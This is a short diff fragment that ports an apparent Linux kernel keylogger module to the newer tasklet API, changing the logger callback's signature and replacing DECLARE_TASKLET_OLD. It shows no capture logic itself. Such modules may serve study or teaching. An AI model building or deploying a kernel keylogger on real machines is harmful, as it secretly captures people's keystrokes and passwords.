@@ -17,12 +17,12 @@ struct keylog_data {
 
 // Declarations
 irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs);
-void tasklet_logger(unsigned long dummy);
+void tasklet_logger(struct tasklet_struct *p);
 
 // Function definitions
 //
 // The tasklet logger
-void tasklet_logger(unsigned long dummy) {
+void tasklet_logger(struct tasklet_struct *p) {
   static int shift = 0;
 
   char buf[32];
@@ -111,7 +111,7 @@ void tasklet_logger(unsigned long dummy) {
 }
 
 // Declaring the Tasklet
-DECLARE_TASKLET_OLD(logging_tasklet, tasklet_logger);
+DECLARE_TASKLET(logging_tasklet, tasklet_logger);
 
 // Main interrupt handler
 irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs) {
